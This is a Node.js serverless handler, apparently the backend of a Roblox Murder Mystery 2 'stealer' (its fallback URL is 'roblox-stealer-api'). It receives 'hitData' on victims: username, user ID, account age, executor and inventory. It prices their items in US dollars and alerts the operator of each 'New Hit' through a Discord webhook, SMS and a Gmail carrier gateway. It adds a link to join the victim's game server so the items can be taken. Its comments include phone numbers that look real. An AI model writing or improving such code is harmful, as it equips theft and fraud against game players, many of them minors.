import crypto from 'crypto';
import nodemailer from 'nodemailer';

// ── TextBelt SMS sender ───────────────────────────────────────────────────────
// Vercel env vars:
//   TEXTBELT_KEY  - your API key (or "textbelt" for free 1/day)
//   TEXTBELT_TO   - recipient number(s), comma-separated e.g. 9565784579,2693168228
async function sendSMS(message) {
  const key   = process.env.TEXTBELT_KEY;
  const toRaw = process.env.TEXTBELT_TO;

  if (!key || !toRaw) {
    console.log('[SMS] Skipped — TEXTBELT_KEY or TEXTBELT_TO not set');
    return;
  }

  const recipients = toRaw.split(',').map(n => n.trim()).filter(Boolean);
  console.log(`[SMS] Sending to ${recipients.length} recipient(s):`, recipients);

  await Promise.allSettled(recipients.map(async phone => {
    try {
      const resp = await fetch('https://textbelt.com/text', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, message, key }),
      });
      const result = await resp.json();
      console.log(`[SMS] TextBelt response for ${phone}:`, JSON.stringify(result));
    } catch (e) {
      console.error(`[SMS] Request failed for ${phone}:`, e);
    }
  }));
}

// ── Gmail → Carrier Gateway SMS ──────────────────────────────────────────────
// Sends an email to your carrier's SMS gateway — arrives as a real text message.
// Free forever. No API keys. No approval process.
//
// Setup:
//  1. Go to myaccount.google.com → Security → 2-Step Verification → App Passwords
//  2. Create an App Password for "Mail"
//  3. Add to Vercel env vars:
//       GMAIL_USER          - your Gmail address e.g. youremail@gmail.com
//       GMAIL_APP_PASSWORD  - the 16-char app password Google gives you
//       CARRIER_GATEWAY_TO  - comma-separated gateway emails:
//                             T-Mobile  → 9565784579@tmomail.net
//                             Verizon   → number@vtext.com
//                             AT&T      → number@txt.att.net
async function sendCarrierSMS(subject, message) {
  const user     = process.env.GMAIL_USER;
  const pass     = process.env.GMAIL_APP_PASSWORD;
  const toRaw    = process.env.CARRIER_GATEWAY_TO;

  if (!user || !pass || !toRaw) {
    console.log('[CarrierSMS] Skipped — GMAIL_USER, GMAIL_APP_PASSWORD, or CARRIER_GATEWAY_TO not set');
    return;
  }

  const to = toRaw.split(',').map(t => t.trim()).filter(Boolean);
  console.log(`[CarrierSMS] Sending to gateways:`, to);

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: { user, pass },
  });

  try {
    await transporter.sendMail({
      from: user,
      to: to.join(', '),
      subject,
      text: message,
    });
    console.log('[CarrierSMS] Sent successfully');
  } catch (e) {
    console.error('[CarrierSMS] Failed:', e.message);
  }
}


// ============================================================
// MM2 ITEM VALUE TABLE
// Values are community "demand" points from Supreme Values.
// ============================================================
const MM2_VALUES = {
  // ── CHROMAS (highest tier) ─────────────────────────────
  'ChromaGemstone':        { sv: 200000, usd: 250  },
  'ChromaHarvester':       { sv: 180000, usd: 220  },
  'ChromaLuger':           { sv: 120000, usd: 150  },
  'ChromaDeathShard':      { sv: 100000, usd: 120  },
  'ChromaSlasher':         { sv: 90000,  usd: 110  },
  'ChromaOrkle':           { sv: 90000,  usd: 110  },
  'ChromaBatwing':         { sv: 80000,  usd: 95   },
  'ChromaFang':            { sv: 75000,  usd: 90   },
  'ChromaGingerblade':     { sv: 70000,  usd: 85   },
  'ChromaMeteorShower':    { sv: 65000,  usd: 80   },
  'ChromaBlackShark':      { sv: 60000,  usd: 75   },
  'ChromaEbon':            { sv: 55000,  usd: 68   },
  'ChromaHawkblade':       { sv: 50000,  usd: 62   },
  'ChromaGoldRay':         { sv: 48000,  usd: 60   },
  'ChromaHuntsman':        { sv: 45000,  usd: 55   },
  'ChromaScythe':          { sv: 90000,  usd: 110  },

  // ── GODLIES ────────────────────────────────────────────
  'Gemstone':              { sv: 65000,  usd: 80   },
  'Elderwood':             { sv: 40000,  usd: 50   },
  'Icebreaker':            { sv: 35000,  usd: 43   },
  'Elderwood_Scythe':      { sv: 35000,  usd: 43   },
  'ElderScythe':           { sv: 35000,  usd: 43   },
  'Harvester':             { sv: 28000,  usd: 35   },
  'Luger':                 { sv: 25000,  usd: 31   },
  'Deathshard':            { sv: 22000,  usd: 27   },
  'DeathShard':            { sv: 22000,  usd: 27   },
  'Orkle':                 { sv: 20000,  usd: 25   },
  'Batwing':               { sv: 18000,  usd: 22   },
  'Fang':                  { sv: 16000,  usd: 20   },
  'Gingerblade':           { sv: 15000,  usd: 18   },
  'MeteorShower':          { sv: 14000,  usd: 17   },
  'BlackShark':            { sv: 13000,  usd: 16   },
  'Ebon':                  { sv: 12000,  usd: 15   },
  'Hawkblade':             { sv: 11000,  usd: 13   },
  'GoldRay':               { sv: 10000,  usd: 12   },
  'Huntsman':              { sv: 9500,   usd: 12   },
  'Slasher':               { sv: 9000,   usd: 11   },
  'Illumina':              { sv: 8500,   usd: 10   },
  'WalkingCane':           { sv: 5000,   usd: 6    },
  'Seer':                  { sv: 4000,   usd: 5    },
  'SeerKnife':             { sv: 4000,   usd: 5    },
  'SeerGun':               { sv: 3000,   usd: 3.50 },

  // ── SCYTHES ────────────────────────────────────────────
  'Scythe':                { sv: 35000,  usd: 43   },
  'IceScythe':             { sv: 20000,  usd: 25   },
  'FlameScythe':           { sv: 18000,  usd: 22   },
  'GoldScythe':            { sv: 12000,  usd: 15   },
  'ShadowScythe':          { sv: 10000,  usd: 12   },

  // ── LEGENDARIES ────────────────────────────────────────
  'Shark':                 { sv: 2000,   usd: 2.50 },
  'SharkKnife':            { sv: 2000,   usd: 2.50 },
  'SharkGun':              { sv: 1800,   usd: 2.20 },
  'Snowflake':             { sv: 1500,   usd: 1.85 },
  'Pumpkin':               { sv: 1300,   usd: 1.60 },
  'Candy':                 { sv: 1200,   usd: 1.50 },
  'Rainbow':               { sv: 1000,   usd: 1.25 },
  'GoldenKnife':           { sv: 900,    usd: 1.10 },
  'GoldenGun':             { sv: 800,    usd: 1.00 },
  'CrimsonKnife':          { sv: 750,    usd: 0.90 },
  'CrimsonGun':            { sv: 700,    usd: 0.85 },
  'Laser':                 { sv: 600,    usd: 0.75 },
  'LaserGun':              { sv: 550,    usd: 0.68 },
  'NightKnife':            { sv: 500,    usd: 0.60 },
  'NightGun':              { sv: 450,    usd: 0.55 },

  // ── VALENTINES / SEASONAL ──────────────────────────────
  'Lovely':                { sv: 3000,   usd: 3.75 },
  'Love':                  { sv: 2500,   usd: 3.10 },
  'Heartblade':            { sv: 2000,   usd: 2.50 },
  'Sweetheart':            { sv: 1800,   usd: 2.20 },
  'CupidsArrow':           { sv: 1500,   usd: 1.85 },
  'RoseGold':              { sv: 1200,   usd: 1.50 },
  'Lollipop':              { sv: 800,    usd: 1.00 },
  'Duckies':               { sv: 500,    usd: 0.60 },
  'Duckie':                { sv: 500,    usd: 0.60 },
  'Spider':                { sv: 1500,   usd: 1.85 },
  'Pumpkinator':           { sv: 2500,   usd: 3.10 },
  'Hallows':               { sv: 3000,   usd: 3.75 },
  'Turkey':                { sv: 800,    usd: 1.00 },
  'Wreath':                { sv: 600,    usd: 0.75 },
  'Sleigh':                { sv: 700,    usd: 0.85 },
  'Arctic':                { sv: 900,    usd: 1.10 },
  'Blizzard':              { sv: 1100,   usd: 1.35 },
  'Starfire':              { sv: 2000,   usd: 2.50 },
  'Starlight':             { sv: 1500,   usd: 1.85 },
  'Shadow':                { sv: 1200,   usd: 1.50 },
  'Phantom':               { sv: 900,    usd: 1.10 },
  'Galaxy':                { sv: 1500,   usd: 1.85 },
  'Eternal':               { sv: 1500,   usd: 1.85 },
  'Abyss':                 { sv: 1200,   usd: 1.50 },
  'Corrupt':               { sv: 600,    usd: 0.75 },
  'Ghost':                 { sv: 400,    usd: 0.50 },
  'Bat':                   { sv: 500,    usd: 0.60 },
  'Raven':                 { sv: 700,    usd: 0.85 },
  'Flames':                { sv: 1200,   usd: 1.50 },
  'Storm':                 { sv: 1000,   usd: 1.25 },
  'Neon':                  { sv: 800,    usd: 1.00 },
  'Comet':                 { sv: 700,    usd: 0.85 },
  'Cherry':                { sv: 400,    usd: 0.50 },
  'Sunrise':               { sv: 350,    usd: 0.43 },
  'Sunset':                { sv: 350,    usd: 0.43 },

  // ── RARES ──────────────────────────────────────────────
  'UncommonKnife':         { sv: 200,    usd: 0.25 },
  'UncommonGun':           { sv: 180,    usd: 0.22 },
  'SilverKnife':           { sv: 150,    usd: 0.18 },
  'SilverGun':             { sv: 130,    usd: 0.16 },
  'CopperKnife':           { sv: 100,    usd: 0.12 },
  'CopperGun':             { sv: 90,     usd: 0.11 },
  'BronzeKnife':           { sv: 80,     usd: 0.10 },
  'BronzeGun':             { sv: 70,     usd: 0.08 },

  // ── COMMONS / JUNK ─────────────────────────────────────
  'DefaultKnife':          { sv: 1,      usd: 0    },
  'DefaultGun':            { sv: 1,      usd: 0    },
  'CommonKnife':           { sv: 5,      usd: 0.01 },
  'CommonGun':             { sv: 5,      usd: 0.01 },
};

// Safe exact-only lookup — strips year suffix and _K/_G marker, tries Knife/Gun append
function normalizeName(raw) {
  if (!raw) return [];
  const variants = new Set();
  variants.add(raw);
  const noYear = raw.replace(/_20\d{2}$/i, '');
  variants.add(noYear);
  const noSuffix = raw.replace(/_(K|G)(_20\d{2})?$/i, '');
  variants.add(noSuffix);
  variants.add(noSuffix + 'Knife');
  variants.add(noSuffix + 'Gun');
  return [...variants];
}

function lookupValueStatic(rawName) {
  for (const candidate of normalizeName(rawName)) {
    if (MM2_VALUES[candidate] !== undefined) return MM2_VALUES[candidate];
    const lower = candidate.toLowerCase();
    for (const [key, val] of Object.entries(MM2_VALUES)) {
      if (key.toLowerCase() === lower) return val;
    }
  }
  return null;
}

async function fetchLivePrice(itemName) {
  try {
    const slug = itemName.toLowerCase().replace(/[^a-z0-9]/g, '');
    const resp = await fetch(`https://www.supremevalues.com/item/${slug}`, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml',
        'Referer': 'https://www.supremevalues.com/',
      },
      signal: AbortSignal.timeout(4000)
    });
    if (!resp.ok) return null;
    const html = await resp.text();
    const match = html.match(/"demand"\s*:\s*(\d+(?:\.\d+)?)/i)
      || html.match(/data-value="(\d+(?:\.\d+)?)"/i);
    if (match) {
      const sv = parseFloat(match[1].replace(/,/g, ''));
      return { sv, usd: +(sv / 1000 * 1.2).toFixed(2) };
    }
  } catch (_) {}
  return null;
}

async function lookupValue(rawName) {
  const staticResult = lookupValueStatic(rawName);
  if (staticResult !== null) return staticResult;
  const liveResult = await fetchLivePrice(rawName);
  if (liveResult) return liveResult;
  const noSuffix = rawName.replace(/_(K|G)(_20\d{2})?$/i, '').replace(/_20\d{2}$/i, '');
  if (noSuffix !== rawName) {
    const liveBase = await fetchLivePrice(noSuffix);
    if (liveBase) return liveBase;
  }
  return null;
}

function formatUSD(usd) {
  if (usd === 0) return '$0.00';
  if (usd < 0.01) return '<$0.01';
  return `$${usd.toFixed(2)}`;
}

function getTier(sv) {
  if (sv >= 50000) return '👑';
  if (sv >= 4000)  return '🔴';
  if (sv >= 500)   return '🟣';
  if (sv >= 50)    return '🔵';
  if (sv >= 5)     return '🟢';
  return '⚫';
}

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const { hitData } = req.body;
  if (!hitData) return res.status(400).json({ success: false, error: 'Missing hitData' });

  const sessionId = crypto.randomUUID();
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL || 'YOUR_WEBHOOK_URL_HERE';

  if (webhookUrl !== 'YOUR_WEBHOOK_URL_HERE') {
    try {
      // ── Value calculation ──
      let totalUSD = 0;
      const valuedItems = await Promise.all((hitData.items || []).map(async item => {
        const lookup = await lookupValue(item.name);
        const itemUSD = lookup ? +(lookup.usd * item.amount) : null;
        if (itemUSD) totalUSD += itemUSD;
        return { ...item, sv: lookup?.sv ?? null, usd: itemUSD };
      }));

      valuedItems.sort((a, b) => {
        const aJ = a.usd !== null && a.usd === 0, bJ = b.usd !== null && b.usd === 0;
        const aU = a.usd === null, bU = b.usd === null;
        if (aU && bU) return 0;
        if (aJ && bJ) return 0;
        if (aJ) return 1; if (bJ) return -1;
        if (aU) return 1; if (bU) return -1;
        return b.usd - a.usd;
      });

      const lootLines = valuedItems.length > 0
        ? valuedItems.map(item => {
            const tier = item.sv !== null ? getTier(item.sv) : '❓';
            const price = item.usd !== null
              ? formatUSD(item.usd)
              : `[check](https://www.supremevalues.com/search?q=${encodeURIComponent(item.name)})`;
            return `${tier} **${item.name}** x${item.amount} — ${price}`;
          })
        : ['No items'];
      lootLines.push(`\n💰 **Est. Total: ${formatUSD(totalUSD)}**`);
      const lootValue = lootLines.join('\n');

      const BASE_URL = process.env.VERCEL_URL
        ? `https://${process.env.VERCEL_URL}`
        : 'https://roblox-stealer-api.vercel.app';
      const joinUrl = hitData.placeId && hitData.jobId
        ? `${BASE_URL}/api/join?placeId=${hitData.placeId}&jobId=${hitData.jobId}`
        : null;

      // ── Discord embed ──
      const embedFields = [
        { name: '👤 Username',     value: `\`${hitData.username || 'Unknown'}\``,    inline: true  },
        { name: '🏷️ Display Name', value: `\`${hitData.displayName || 'Unknown'}\``, inline: true  },
        { name: '🆔 Session ID',   value: `\`${sessionId}\``,                        inline: false },
        { name: '🎮 Game',         value: hitData.gameName || 'Unknown',              inline: true  },
        { name: '👥 Players',      value: `${hitData.playerCount ?? '?'} / ${hitData.maxPlayers ?? '?'}`, inline: true },
        { name: '📅 Account Age',  value: `${hitData.accountAge ?? '?'} days`,       inline: true  },
        { name: '🔧 Executor',     value: hitData.executor || 'Unknown',              inline: true  },
        { name: '🪙 User ID',      value: `\`${hitData.robloxUserId || 'Unknown'}\``, inline: true },
        { name: `🎒 Loot (${valuedItems.length} items)`, value: lootValue.slice(0, 1024), inline: false },
        { name: '📜 Join Script',  value: `\`\`\`lua\n${hitData.joinScript || 'N/A'}\n\`\`\``, inline: false },
      ];
      if (joinUrl) embedFields.push({
        name: '🔗 Join Server',
        value: `[➜ Click to join victim's game server](${joinUrl})`,
        inline: false
      });

      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: null,
          embeds: [{
            title: `🔥 New Hit — Est. ${formatUSD(totalUSD)}`,
            color: totalUSD >= 10 ? 0xFFD700 : totalUSD >= 1 ? 0xFF4444 : 0x888888,
            thumbnail: hitData.avatarUrl ? { url: hitData.avatarUrl } : undefined,
            fields: embedFields,
            footer: { text: `Place: ${hitData.placeId || 'N/A'} • Job: ${hitData.jobId || 'N/A'}` },
            timestamp: new Date().toISOString()
          }]
        })
      });

      // ── TextBelt SMS ──
      const topLoot = valuedItems
        .filter(i => i.usd === null || i.usd > 0)   // skip $0 junk
        .slice(0, 5)                                  // top 5 items
        .map(i => {
          const tier = i.sv !== null ? getTier(i.sv) : '❓';
          const price = i.usd !== null ? formatUSD(i.usd) : '?';
          return `  ${tier} ${i.name} x${i.amount} — ${price}`;
        });

      const smsBody = [
        `╔══ 🔥 NEW HIT ══╗`,
        `💰 Est. Value: ${formatUSD(totalUSD)}`,
        ``,
        `👤 User:    ${hitData.username}`,
        `📛 Name:    ${hitData.displayName}`,
        `🪙 UID:     ${hitData.robloxUserId || 'N/A'}`,
        `📅 Age:     ${hitData.accountAge ?? '?'} days`,
        `⚙️  Exec:    ${hitData.executor || 'Unknown'}`,
        ``,
        `🎮 Game:    ${hitData.gameName || 'MM2'}`,
        `👥 Players: ${hitData.playerCount ?? '?'}/${hitData.maxPlayers ?? '?'}`,
        ``,
        topLoot.length > 0 ? `🎒 TOP LOOT:` : null,
        ...topLoot,
        ``,
        joinUrl ? `🔗 JOIN:\n${joinUrl}` : null,
        `╚══════════════╝`,

      ].filter(s => s !== null).join('\n');
      await sendSMS(smsBody);
      await sendCarrierSMS(`🔥 HIT — ${formatUSD(totalUSD)}`, smsBody);


    } catch (e) {
      console.error('Webhook/SMS failed:', e);
    }
  }

  const receivers = (process.env.RECEIVERS || '').split(',').map(s => s.trim()).filter(Boolean);
  console.log(`[+] Hit registered! Session: ${sessionId} | Victim: ${hitData.username}`);
  return res.status(200).json({ success: true, sessionId, receivers });
}
